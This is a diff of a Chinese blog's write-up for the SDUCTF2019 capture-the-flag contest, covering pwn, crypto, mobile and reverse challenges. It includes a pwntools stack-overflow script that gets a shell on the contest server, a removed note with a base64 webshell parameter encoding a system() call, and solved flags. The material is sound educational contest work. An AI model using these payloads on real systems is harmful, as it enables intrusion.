+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">"ctf.sec.sdunet.cn"</span>,<span class="string">"38268"</span>)</span><br><span class="line"><span class="comment">#sh = process(./stackoverflow)</span></span><br><span class="line">success_addr=<span class="number">0x08048486</span></span><br><span class="line"><span class="comment">#payload = 'a' * 0x14 + 'bbbb' + p32(success_addr)</span></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x14</span> + <span class="string">'bbbb'</span> + <span class="string">'\x86\x84\x04\x08'</span></span><br><span class="line">print(p32(success_addr)</span><br><span class="line"><span class="comment">#out&gt;&gt;&gt;b'\x86\x84\x04\x08'</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<p>用pwntools直接构造exp，getshell，获得flag</p>
+<p><img src="/2019/11/15/SDUCTF2019-wp/pwn3.jpg" alt></p>
+<p>其中遇到了一个编码问题：</p>
+<p><img src="/2019/11/15/SDUCTF2019-wp/pwn3-5.jpg" alt></p>
+<p>因为地址用p32转成地址形式为<code>b&#39;\x86\x84\x04\x08</code>所以一直编码不成功，导致payload连接失败不能成功getshell</p>
+<p>在decode时使用<code>&#39;ignore&#39;</code>模式，<code>\x86\x84</code>两个字符会被忽略，说明是非法字符。</p>
+<p><strong>不懂是啥错误！！</strong></p>
+<p>pwn自带的flat方法可以拼接字符串避开str连接的错误，flat方法传入一个列表<code>list[]</code>，list里放所需要拼接的对象 ： <code>payload = flat([&#39;a&#39;*24,&#39;bbbb&#39;,addr])</code></p>
 <h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a><center>Crypto</center></h2><h3 id="0x01-Base"><a href="#0x01-Base" class="headerlink" title="0x01 Base"></a>0x01 Base</h3><blockquote>
 <p>题目描述：[<a href="https://baike.baidu.com/item/贝斯/]" target="_blank" rel="noopener">https://baike.baidu.com/item/贝斯/]</a></p>
 <p><a href="https://www.google.com/search?q=ZmxhZ3tiYXNlNjRfaXNfbm90X2FuX2VuY3J5cHRpb25fbWV0aG9kfQ" target="_blank" rel="noopener">奇怪的链接</a></p>
@@ -822,6 +931,38 @@
 <p>我记得之前做题时有看见过类似密码，但是忘了是啥。</p>
 <p>最明显的，先把中尉名字<code>Georges Painvin</code>百度一波，得知时<code>ADFGVX密码</code>对照密码表，解得flag：<code>flag{youarearealhacker}</code></p>
 <p><img src="/2019/11/15/SDUCTF2019-wp/crypto6.jpg" alt="图源自百度百科"></p>
+<h3 id="0x07-ok"><a href="#0x07-ok" class="headerlink" title="0x07 ok?"></a>0x07 ok?</h3><blockquote>
+<p>题目描述：</p>
+<p>就问你ok不ok</p>
+<p>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook# Ook. Ook# Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook! Ook# Ook. Ook# Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook# Ook. Ook# Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook! Ook# Ook. Ook# Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook# Ook. Ook# Ook! Ook. Ook# Ook! Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook! Ook# Ook. Ook# Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook# Ook. Ook# Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook! Ook# Ook. Ook# Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook# Ook. Ook# Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook# Ook. Ook# Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook# Ook. Ook# Ook! Ook. Ook# Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook# Ook. Ook# Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook# Ook. Ook# Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook# Ook. Ook# Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook! Ook. Ook# Ook.</p>
+</blockquote>
+<p>既然是密码题，那就百度呗</p>
+<p>搜索的是ok密码，文章和转换的github地址如下</p>
+<blockquote>
+<p><a href="https://www.splitbrain.org/services/ook" target="_blank" rel="noopener">https://www.splitbrain.org/services/ook</a> </p>
+<p><a href="https://github.com/splitbrain/ook" target="_blank" rel="noopener">https://github.com/splitbrain/ook</a> </p>
+</blockquote>
+<p>不过有点不对，观察样例密码，把#换成?，解得flag</p>
+<h3 id="0x08-什么密码？"><a href="#0x08-什么密码？" class="headerlink" title="0x08 什么密码？"></a>0x08 什么密码？</h3><blockquote>
+<p>题目描述：</p>
+<p>EVA给Tom发了一封邮件，但是Tom却看不懂EVA想表达什么，请你向Tom解释一下这封邮件</p>
+<p>发件人：EVA<br>收件人：Tom<br>Pxevhfxmhietrpbmamablztfx</p>
+<p>flag格式：sductf{+.}</p>
+<p>The answer is related to my favorite movie.</p>
+</blockquote>
+<p>密码可能做着做着心态崩了，不小心把Crypto当misc做了</p>
+<p>把图片下下来，没注意到图片上到Cesar，binwalk跑一波图片，发下里面还有一个zlib，百度解zlib，然后疯狂报错，贼难受，然后看了hint，得知凯撒密码</p>
+<p>难受 -600point</p>
+<p>位移几位忘了。</p>
+<p>And 十分真实，都把顺序放我TODO List下了，妈耶</p>
+<p>什么密码？<a href="https://blog.csdn.net/qq_40574571/article/details/80164981" target="_blank" rel="noopener">https://blog.csdn.net/qq_40574571/article/details/80164981</a></p>
+<p><img src="/2019/11/15/SDUCTF2019-wp/crypto8.jpg" alt></p>
+<h3 id="0x09-Mix"><a href="#0x09-Mix" class="headerlink" title="0x09 Mix"></a>0x09 Mix</h3><blockquote>
+<p>题目描述：解开她，flag就是你的了</p>
+<p> JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzY7JiN4MzM7JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzM7JiN4MzE7JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzM7JiN4Mzc7JiN4MjU7JiN4MzM7JiN4Mzc7JiN4MjU7JiN4MzY7JiN4MzI7JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzY7JiN4MzQ7JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzM7JiN4Mzk7JiN4MjU7JiN4MzM7JiN4Mzc7JiN4MjU7JiN4MzM7JiN4Mzg7JiN4MjU7JiN4MzM7JiN4MzU7JiN4MjU7JiN4MzY7JiN4MzY7JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzY7JiN4MzQ7JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzM7JiN4Mzk7JiN4MjU7JiN4MzM7JiN4Mzc7JiN4MjU7JiN4MzM7JiN4Mzg7JiN4MjU7JiN4MzM7JiN4MzU7JiN4MjU7JiN4MzY7JiN4MzY7JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzM7JiN4MzM7JiN4MjU7JiN4MzM7JiN4Mzc7JiN4MjU7JiN4MzM7JiN4MzI7JiN4MjU7JiN4MzM7JiN4Mzc7JiN4MjU7JiN4MzM7JiN4Mzk7JiN4MjU7JiN4MzM7JiN4Mzc7JiN4MjU7JiN4MzM7JiN4MzA7JiN4MjU7JiN4MzM7JiN4Mzc7JiN4MjU7JiN4MzM7JiN4MzQ7JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzY7JiN4MzY7JiN4MjU7JiN4MzM7JiN4Mzc7JiN4MjU7JiN4MzY7JiN4MzQ7 </p>
+</blockquote>
+<p>一看这种就是混合密码，靠直觉先解一波base64，然后发下可以解下去，发一波解密顺序，忘记录flag了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">（base64-&gt;unicode-&gt;转中文（utf-8)-&gt;urldecode-&gt;hex decode）</span><br></pre></td></tr></table></figure>
 <h2 id="Mobile"><a href="#Mobile" class="headerlink" title="Mobile"></a><center>Mobile</center></h2><h3 id="0x01-apk1"><a href="#0x01-apk1" class="headerlink" title="0x01 apk1"></a>0x01 apk1</h3><blockquote>
 <p> 题目描述：用着安卓手机，你懂apk吗？ </p>
 </blockquote>
@@ -834,6 +975,25 @@
 <p><img src="/2019/11/15/SDUCTF2019-wp/mobile-apk2.jpg" alt></p>
 <p>然后看代码可知是对字符串进行一个排序，将字符串里的第i位放到s2[i]位，得到结果</p>
 <p>直接写一个python脚本得到flag</p>
+<h3 id="0x03-apk3"><a href="#0x03-apk3" class="headerlink" title="0x03 apk3"></a>0x03 apk3</h3><blockquote>
+<p> 题目描述：再来一发，听说过Kotlin吗？ </p>
+</blockquote>
+<p>下下来解压按套路拖给<code>d2j-dex2jar</code>然后发现有两个<code>.dex</code>后缀的文件，逆向报错</p>
+<p>于是现去网上下了一个jeb逆向，然后找一个样例现学jeb</p>
+<p><img src="/2019/11/15/SDUCTF2019-wp/mobile-apk3-2.jpg" alt></p>
+<p>直觉看这个字符串有用，然后在下面果然发现</p>
+<p><img src="/2019/11/15/SDUCTF2019-wp/mobile-apk3-1.jpg" alt></p>
+<p>play函数就是对这个字符串进行比对，就是将字符串的偶数位的ascii值减2，得到新串与该字符串进行比较</p>
+<p>写个python脚本逆着加回去可得flag</p>
+<p>apk3：sductf{Easy_Apk_1s_n0t_hard_4_U!}</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;f</span><br><span class="line"><span class="string">'a2P1W3Pmc0Tha3jfOX@rVzDzV22wbF7oWXHkVzPfTSD9'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">if</span> cnt%<span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line"><span class="meta">... </span>            s += chr(ord(i)+<span class="number">2</span>)</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">else</span>:</span><br><span class="line"><span class="meta">... </span>            s+=i</span><br><span class="line"><span class="meta">... </span>    cnt += <span class="number">1</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s</span><br><span class="line"><span class="string">'c2R1Y3Rme0Vhc3lfQXBrXzFzX24wdF9oYXJkXzRfVSF9'</span></span><br></pre></td></tr></table></figure>
+<h3 id="0x04-FuckAPP"><a href="#0x04-FuckAPP" class="headerlink" title="0x04 FuckAPP"></a>0x04 FuckAPP</h3><blockquote>
+<p>题目描述：  你真的懂apk吗？ </p>
+</blockquote>
+<p>常规，拖进jeb看main函数，发现只有一些setViewID之类的函数并没有主要的逻辑，于是回去将apk解压缩</p>
+<p>发现包里和以前的apk解压不同，apk3是多了一个Kotlin文件夹，而这个fuck app 是多了一个lib文件夹，猜主要的函数在里面，打开<code>lib/arm64-v8a</code>得到一个<code>libnative-lib.so</code>，拖进IDA里进行逆向</p>
+<p><img src="/2019/11/15/SDUCTF2019-wp/mobile-apk4-fuck.jpg" alt></p>
+<p>暴力搜一波果然看到了flag，直接得到flag，还以为要看函数逻辑。</p>
 <h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a><center>Reverse</center></h2><h3 id="0x01-Java-jar"><a href="#0x01-Java-jar" class="headerlink" title="0x01 Java jar"></a>0x01 Java jar</h3><blockquote>
 <p>题目描述： 都是java程序员，互相偷个代码谁不会呀！ </p>
 </blockquote>
@@ -860,7 +1020,18 @@
 <p><img src="/2019/11/15/SDUCTF2019-wp/re3-rust-4.jpg" alt></p>
 <p>既然是逆向，那就从尾部往后面看，果然看到一个判断和一个类似flag的字符串<code>c2R1Y3Rme0lfbDB2ZV9ydXN0X2hoaGh9</code>，base64解码得到flag：<code>sductf{I_l0ve_rust_hhhh}</code></p>
 <p><img src="/2019/11/15/SDUCTF2019-wp/re3-rust-5.jpg" alt></p>
-<h1 id="TODO-List"><a href="#TODO-List" class="headerlink" title="TODO List"></a>TODO List</h1><p>web：http头，robots，你的ip不太对(XFF)，登陆(Cookie:login=1)，破解MD5(php function fail)，php是最好的语言(extract()函数变量覆盖)，一句话木马2(cmd=c3lzdGVtKCdjYXQgZmZmZmxsbGxhYWFhZ2dnZycpOw==)，拼手速(python requests)</p>
+<h3 id="0x04-EasyCrackMe"><a href="#0x04-EasyCrackMe" class="headerlink" title="0x04 EasyCrackMe"></a>0x04 EasyCrackMe</h3><blockquote>
+<p>题目描述：无</p>
+</blockquote>
+<p>下下来是一个exe文件，用010editor打开，发现说是PE文件，而且也发现是PE文件头，于是拖进去IDA逆向。</p>
+<p>逆向main函数无思路，便开TextView查看，看到如下图黄色字符串感觉很奇怪，而且下面有一个Congratulations！，猜测这段字符串是flag</p>
+<p><img src="/2019/11/15/SDUCTF2019-wp/re4-1.jpg" alt></p>
+<p>F5进入查看具体函数，大概是对输入字符串的每一位与0x16进行异或得到v5字符串</p>
+<p><img src="/2019/11/15/SDUCTF2019-wp/re4-2.jpg" alt></p>
+<p>于是用python逆函数一波，果然得到flag</p>
+<p><img src="/2019/11/15/SDUCTF2019-wp/re4-3.jpg" alt></p>
+<p>在后面写wp时，完善了思路。</p>
+<p>因为进去运行提示输入一个key，然后就在IDA的TextView搜索key，得到第一张图的函数入口，接下来看逻辑即可。</p>
 
       
     </div>
@@ -1144,7 +1315,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SDUCTF2019-WriteUp"><span class="nav-number">1.</span> <span class="nav-text">SDUCTF2019-WriteUp</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Web"><span class="nav-number">1.1.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-最简答的Web题"><span class="nav-number">1.1.1.</span> <span class="nav-text">0x01 最简答的Web题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-按钮点击"><span class="nav-number">1.1.2.</span> <span class="nav-text">0x02 按钮点击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-量子波动速读"><span class="nav-number">1.1.3.</span> <span class="nav-text">0x03 量子波动速读</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-芝麻开门"><span class="nav-number">1.1.4.</span> <span class="nav-text">0x04 芝麻开门</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x05-Funny-Button"><span class="nav-number">1.1.5.</span> <span class="nav-text">0x05 Funny Button</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x06-曲奇"><span class="nav-number">1.1.6.</span> <span class="nav-text">0x06 曲奇</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x07-GET"><span class="nav-number">1.1.7.</span> <span class="nav-text">0x07 GET</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x08-未来浏览器"><span class="nav-number">1.1.8.</span> <span class="nav-text">0x08 未来浏览器</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x09-POST"><span class="nav-number">1.1.9.</span> <span class="nav-text">0x09 POST</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x0a-vim好用啊"><span class="nav-number">1.1.10.</span> <span class="nav-text">0x0a vim好用啊</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x0b-一句话木马"><span class="nav-number">1.1.11.</span> <span class="nav-text">0x0b 一句话木马</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x0c-达拉崩吧"><span class="nav-number">1.1.12.</span> <span class="nav-text">0x0c 达拉崩吧</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x0d-HTTP头"><span class="nav-number">1.1.13.</span> <span class="nav-text">0x0d HTTP头</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x0e-robots"><span class="nav-number">1.1.14.</span> <span class="nav-text">0x0e robots</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x0f-你的IP不太对"><span class="nav-number">1.1.15.</span> <span class="nav-text">0x0f 你的IP不太对</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x10-登录"><span class="nav-number">1.1.16.</span> <span class="nav-text">0x10 登录</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x11-破解md5"><span class="nav-number">1.1.17.</span> <span class="nav-text">0x11 破解md5</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x12-php是最好的语言"><span class="nav-number">1.1.18.</span> <span class="nav-text">0x12 php是最好的语言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x13-一句话木马2"><span class="nav-number">1.1.19.</span> <span class="nav-text">0x13 一句话木马2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x14-拼手速"><span class="nav-number">1.1.20.</span> <span class="nav-text">0x14 拼手速</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Misc"><span class="nav-number">1.2.</span> <span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-Gif"><span class="nav-number">1.2.1.</span> <span class="nav-text">0x01 Gif</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-PDF"><span class="nav-number">1.2.2.</span> <span class="nav-text">0x02 PDF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-今晚月色美吗"><span class="nav-number">1.2.3.</span> <span class="nav-text">0x03 今晚月色美吗</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-聋子听声音"><span class="nav-number">1.2.4.</span> <span class="nav-text">0x04 聋子听声音</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x05-二进制"><span class="nav-number">1.2.5.</span> <span class="nav-text">0x05 二进制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x06-奇怪的压缩文件"><span class="nav-number">1.2.6.</span> <span class="nav-text">0x06 奇怪的压缩文件</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PWN"><span class="nav-number">1.3.</span> <span class="nav-text">PWN</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-Simple-nc"><span class="nav-number">1.3.1.</span> <span class="nav-text">0x01 Simple nc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-猜拳"><span class="nav-number">1.3.2.</span> <span class="nav-text">0x02 猜拳</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Crypto"><span class="nav-number">1.4.</span> <span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-Base"><span class="nav-number">1.4.1.</span> <span class="nav-text">0x01 Base</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-诡异的数字"><span class="nav-number">1.4.2.</span> <span class="nav-text">0x02 诡异的数字</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-九宫格"><span class="nav-number">1.4.3.</span> <span class="nav-text">0x03 九宫格</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-键盘追踪"><span class="nav-number">1.4.4.</span> <span class="nav-text">0x04 键盘追踪</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x05-宇宙终极问题"><span class="nav-number">1.4.5.</span> <span class="nav-text">0x05 宇宙终极问题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x06-秘密报文"><span class="nav-number">1.4.6.</span> <span class="nav-text">0x06 秘密报文</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Mobile"><span class="nav-number">1.5.</span> <span class="nav-text">Mobile</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-apk1"><span class="nav-number">1.5.1.</span> <span class="nav-text">0x01 apk1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-apk2"><span class="nav-number">1.5.2.</span> <span class="nav-text">0x02 apk2</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reverse"><span class="nav-number">1.6.</span> <span class="nav-text">Reverse</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-Java-jar"><span class="nav-number">1.6.1.</span> <span class="nav-text">0x01 Java jar</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-C"><span class="nav-number">1.6.2.</span> <span class="nav-text">0x02 C</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-Rust"><span class="nav-number">1.6.3.</span> <span class="nav-text">0x03 Rust</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#TODO-List"><span class="nav-number">2.</span> <span class="nav-text">TODO List</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SDUCTF2019-WriteUp"><span class="nav-number">1.</span> <span class="nav-text">SDUCTF2019-WriteUp</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Web"><span class="nav-number">1.1.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-最简答的Web题"><span class="nav-number">1.1.1.</span> <span class="nav-text">0x01 最简答的Web题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-按钮点击"><span class="nav-number">1.1.2.</span> <span class="nav-text">0x02 按钮点击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-量子波动速读"><span class="nav-number">1.1.3.</span> <span class="nav-text">0x03 量子波动速读</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-芝麻开门"><span class="nav-number">1.1.4.</span> <span class="nav-text">0x04 芝麻开门</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x05-Funny-Button"><span class="nav-number">1.1.5.</span> <span class="nav-text">0x05 Funny Button</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x06-曲奇"><span class="nav-number">1.1.6.</span> <span class="nav-text">0x06 曲奇</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x07-GET"><span class="nav-number">1.1.7.</span> <span class="nav-text">0x07 GET</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x08-未来浏览器"><span class="nav-number">1.1.8.</span> <span class="nav-text">0x08 未来浏览器</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x09-POST"><span class="nav-number">1.1.9.</span> <span class="nav-text">0x09 POST</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x0a-vim好用啊"><span class="nav-number">1.1.10.</span> <span class="nav-text">0x0a vim好用啊</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x0b-一句话木马"><span class="nav-number">1.1.11.</span> <span class="nav-text">0x0b 一句话木马</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x0c-达拉崩吧"><span class="nav-number">1.1.12.</span> <span class="nav-text">0x0c 达拉崩吧</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x0d-HTTP头"><span class="nav-number">1.1.13.</span> <span class="nav-text">0x0d HTTP头</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x0e-robots"><span class="nav-number">1.1.14.</span> <span class="nav-text">0x0e robots</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x0f-你的IP不太对"><span class="nav-number">1.1.15.</span> <span class="nav-text">0x0f 你的IP不太对</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x10-登录"><span class="nav-number">1.1.16.</span> <span class="nav-text">0x10 登录</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x11-破解md5"><span class="nav-number">1.1.17.</span> <span class="nav-text">0x11 破解md5</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x12-php是最好的语言"><span class="nav-number">1.1.18.</span> <span class="nav-text">0x12 php是最好的语言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x13-一句话木马2"><span class="nav-number">1.1.19.</span> <span class="nav-text">0x13 一句话木马2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x14-拼手速"><span class="nav-number">1.1.20.</span> <span class="nav-text">0x14 拼手速</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x15-信息泄露"><span class="nav-number">1.1.21.</span> <span class="nav-text">0x15 信息泄露</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x16-web图床"><span class="nav-number">1.1.22.</span> <span class="nav-text">0x16 web图床</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Misc"><span class="nav-number">1.2.</span> <span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-Gif"><span class="nav-number">1.2.1.</span> <span class="nav-text">0x01 Gif</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-PDF"><span class="nav-number">1.2.2.</span> <span class="nav-text">0x02 PDF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-今晚月色美吗"><span class="nav-number">1.2.3.</span> <span class="nav-text">0x03 